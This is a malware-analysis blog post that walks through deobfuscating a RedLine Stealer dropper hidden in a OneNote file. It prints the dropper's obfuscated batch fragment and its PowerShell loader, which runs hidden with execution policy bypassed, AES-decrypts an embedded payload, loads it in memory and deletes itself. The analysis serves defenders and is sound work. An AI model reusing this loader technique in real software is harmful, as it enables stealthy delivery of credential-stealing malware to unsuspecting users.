---
title: RedLine Stealer Dropper
url: https://blog.cerbero.io/?p=2542
source: Cerbero Blog
date: 2023-03-08
fetch_date: 2025-10-04T08:54:20.419912
---

# RedLine Stealer Dropper

[Skip to content](#content)

[Cerbero Blog](https://blog.cerbero.io/)

Menu

* [Home](https://cerbero.io)
* Products
  + [Cerbero Suite](https://cerbero.io/suite/)
  + [Cerbero Engine](https://cerbero.io/engine/)
* [Packages](https://cerbero.io/packages/)
* [E-Zine](https://cerbero.io/e-zine/)
* [Blog](/)
* Support
  + [User Manual](https://cerbero.io/manual/)
  + [SDK Documentation](https://sdk.cerbero.io/)
  + [FAQ](https://cerbero.io/faq/)
  + [Resources](https://cerbero.io/resources/)
  + [Contact](https://cerbero.io/contact/)
* [Shop](https://cerbero.io/shop/)
  + [My account](https://cerbero.io/my-account/)
  + [Cart](https://cerbero.io/cart/)

# RedLine Stealer Dropper

An interesting sample containing a number of different obfuscation techniques. In this article we analyze the dropper in detail and reach the final stage.

SHA256: 0B93B5287841CEF2C6B2F2C3221C59FFD61BF772CD0D8B2BDAB9DADEB570C7A6

The first file we encounter is a OneNote document. If the “OneNote Format” package is installed, all files are automatically extracted.

[![](/wp-content/uploads/2023/03/msmw/1.png)](/wp-content/uploads/2023/03/msmw/1.png)

Among the extracted files there are two unidentified ones which are just Windows batch scripts.

[![](/wp-content/uploads/2023/03/msmw/2.png)](/wp-content/uploads/2023/03/msmw/2.png)

We convert the data to text (Ctrl+R -> Conversion / Bytes to text).

[![](/wp-content/uploads/2023/03/msmw/3.png)](/wp-content/uploads/2023/03/msmw/3.png)

The code of the batch scripts is obfuscated.

```
@echo off
set "sMFb=set "
%sMFb%"UFbRmjLRRG=1."
%sMFb%"UwPAONnVOa=co"
%sMFb%"COdAYzdUBF=ll"
%sMFb%"ToDPGEsHPu= C"
%sMFb%"StQVmXXdbu=Po"
%sMFb%"ueTVKWMlnO=we"
%sMFb%"GTAKfFaJew="%~0."
%sMFb%"bgIMqeWlgi=in"
%sMFb%"sRkmhFTZTk=nd"
:: gpUJGV0UmogBpXJpjNr6mswTbRMbSjLzaCIgHlG36VZdfdnkweRkrCB1uF/LvTqM9wtzIUPivhAwiHEHBFv19iFB57OFRRGSiNnMUZlTORojmHEW7KARYxcA
etc.
```

So we use the “Simple Batch Emulator” package to emulate the code.

[![](/wp-content/uploads/2023/03/msmw/4.png)](/wp-content/uploads/2023/03/msmw/4.png)

The emulator prints out the commands not being emulated.

[![](/wp-content/uploads/2023/03/msmw/5.png)](/wp-content/uploads/2023/03/msmw/5.png)

```
unsupported command: copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "%~0.exe"
unsupported command: cd "%~dp0"
unsupported command: "%~nx0.exe" -noprofile -windowstyle hidden -ep bypass -command $mcWPL = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine);foreach ($jBqHb in $mcWPL) { if ($jBqHb.StartsWith(':: ')) {  $qUflk = $jBqHb.Substring(3); break; }; };$AKzOG = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($qUflk);$GTqqO = New-Object System.Security.Cryptography.AesManaged;$GTqqO.Mode = [System.Security.Cryptography.CipherMode]::CBC;$GTqqO.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$GTqqO.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('rYCDvAfAeZYTmiLeZKnw0z4us9jgkCckB7mS60qxxg4=');$GTqqO.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('JYh62EWEKCuIH7WrUJ0VdA==');$QTfFw = $GTqqO.CreateDecryptor();$AKzOG = $QTfFw.TransformFinalBlock($AKzOG, 0, $AKzOG.Length);$QTfFw.Dispose();$GTqqO.Dispose();$xVFCH = New-Object System.IO.MemoryStream(, $AKzOG);$qGLhv = New-Object System.IO.MemoryStream;$wRtOX = New-Object System.IO.Compression.GZipStream($xVFCH, [IO.Compression.CompressionMode]::Decompress);$wRtOX.CopyTo($qGLhv);$wRtOX.Dispose();$xVFCH.Dispose();$qGLhv.Dispose();$AKzOG = $qGLhv.ToArray();$VBqqY = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($AKzOG);$ReoQh = $VBqqY.EntryPoint;$ReoQh.Invoke($null, (, [string[]] ('%*')))
unsupported command: (goto) 2>nul & del "%~f0"
unsupported command: exit /b
```

We open a new text view and paste the PowerShell code.

[![](/wp-content/uploads/2023/03/msmw/6.png)](/wp-content/uploads/2023/03/msmw/6.png)

As the PowerShell code is obfuscated, we deobfuscate it using the “PowerShell Beautifier” package.

[![](/wp-content/uploads/2023/03/msmw/7.png)](/wp-content/uploads/2023/03/msmw/7.png)

We don’t need variable replacement, so we leave that option unchecked.

[![](/wp-content/uploads/2023/03/msmw/8.png)](/wp-content/uploads/2023/03/msmw/8.png)

The PowerShell beautifer not only deobfuscates the code, but also assigns to all the variables meaningful names.

[![](/wp-content/uploads/2023/03/msmw/9.png)](/wp-content/uploads/2023/03/msmw/9.png)

The code is now easy to understand.

```
$read_all_text_result = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);
foreach ($item in $read_all_text_result)
{
    if ($item.StartsWith(':: '))
    {
        $substring_result = $item.Substring(3);
        break;
    };
};
$from_base64_string_result = [System.Convert]::FromBase64String($substring_result);
$aes_managed = New-Object System.Security.Cryptography.AesManaged;
$aes_managed.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$aes_managed.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$aes_managed.Key = [System.Convert]::FromBase64String('rYCDvAfAeZYTmiLeZKnw0z4us9jgkCckB7mS60qxxg4=');
$aes_managed.IV = [System.Convert]::FromBase64String('JYh62EWEKCuIH7WrUJ0VdA==');
$create_decryptor_result = $aes_managed.CreateDecryptor();
$transform_final_block_result = $create_decryptor_result.TransformFinalBlock($from_base64_string_result, 0, $from_base64_string_result.Length);
$create_decryptor_result.Dispose();
$aes_managed.Dispose();
$memory_stream = New-Object System.IO.MemoryStream(, $transform_final_block_result);
$memory_stream_2 = New-Object System.IO.MemoryStream;
$gzip_stream = New-Object System.IO.Compression.GZipStream($memory_stream, [IO.Compression.CompressionMode]::Decompress);
$gzip_stream.CopyTo($memory_stream_2);
$gzip_stream.Dispose();
$memory_stream.Dispose();
$memory_stream_2.Dispose();
$to_array_result = $memory_stream_2.ToArray();
$load_result = [System.Reflection.Assembly]::Load($to_array_result);
$entry_point = $load_result.EntryPoint;
$entry_point.Invoke($null, (, [string[]]'%*'))
```

The PowerShell code searches for a line starting with ‘:: ‘ in the output of the batch script. Then converts that line from base64, decrypts it using AES CBC, decompresses the decrypted data using GZip and finally loads the decompressed data as a .NET assembly.

So we select the base64 line skipping ‘:: ‘.

[![](/wp-content/uploads/2023/03/msmw/10.png)](/wp-content/uploads/2023/03/msmw/10.png)

We convert the base64 to bytes.

[![](/wp-content/uploads/2023/03/msmw/11.png)](/wp-content/uploads/2023/03/msmw/11.png)

We retrieve the key and IV of the AES, convert them from base64 and then to hex (in the hex view Copy -> Hex).

[![](/wp-content/uploads/2023/03/msmw/12.png)](/wp-content/uploads/2023/03/msmw/12.png)

And use the “decrypt/aes” filter with a key length of 32 to decrypt the data.

[![](/wp-content/uploads/2023/03/msmw/13.png)](/wp-content/uploads/2023/03/msmw/13.png)

We then select all the decrypted data, open the context menu and click on “Make selection a root file” to add a new root file to our current project. In the format dialog we select the GZip format (GZ).

[![](/wp-content/uploads/2023/03/msmw/14.png)](/wp-content/uploads/2023/03/msmw/14.png)

The decompressed file is an executable which contains another file called “payload.exe”. This file is automatically extracted by Cerbero Suite from the .NET manifest resources. However, it is not recognized as an executable and so we guess that it is probably encrypted.

[![](/wp-content/uploads/2023/03/msmw/15.png)](/wp-content/uploads/2023/03/msmw/15.png)

We can explore the MSIL code of the .NET assembly, but the code would be easier to read as decompiled C#.

[![](/wp-content/uploads/2023/03/msmw/16.png)](/wp-content/uploads/2023/03/msmw/16.png)

So we save the decompressed executable to disk and open it with [ILSpy](https://github.com/icsharpcode/ILSpy).

[![](/wp-content/uploads/2023/03/msmw/17.png)](/wp-content/uploads/2023/03/msmw/17.png)

The follo...